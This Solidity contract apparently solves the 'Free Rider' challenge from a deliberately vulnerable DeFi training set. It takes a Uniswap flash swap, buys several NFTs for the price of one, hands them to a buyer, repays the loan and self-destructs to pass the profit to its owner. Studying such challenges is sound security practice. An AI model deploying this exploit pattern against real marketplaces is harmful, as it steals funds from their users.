// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ERC721Holder} from "openzeppelin-contracts/token/ERC721/utils/ERC721Holder.sol";

contract Attacker is ERC721Holder {
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace;
    address public buyer;
    address public owner;
    uint8 public numberOfNFT;
    uint256 public nftPrice;

    constructor(
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace,
        uint8 _numberOfNFT,
        uint256 _nftPrice,
        address _freeRiderBuyer
    ) {
        owner = msg.sender;
        buyer = _freeRiderBuyer;
        pair = _pair;
        marketplace = _marketplace;
        numberOfNFT = _numberOfNFT;
        nftPrice = _nftPrice;
    }

    function exploit() external {
        // need to pass some data to trigger uniswapV2Call
        // borrow 15 ether of WETH
        bytes memory data = abi.encode(pair.token1(), nftPrice);

        pair.swap(0, nftPrice, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(address _sender, uint256, uint256, bytes calldata _data) external {
        require(msg.sender == address(pair), "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(_data, (address, uint256));

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // unwrap WETH
        WETH9 weth = WETH9(payable(tokenBorrow));
        weth.withdraw(amount);

        // buy tokens from the marketplace
        uint256[] memory tokenIds = new uint256[](numberOfNFT);
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: nftPrice}(tokenIds);
        DamnValuableNFT nft = DamnValuableNFT(marketplace.token());

        // send all of them to the buyer
        for (uint256 tokenId = 0; tokenId < numberOfNFT; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // wrap enough WETH9 to repay our debt
        weth.deposit{value: amountToRepay}();

        // repay the debt
        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);

        // selfdestruct to the owner
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}
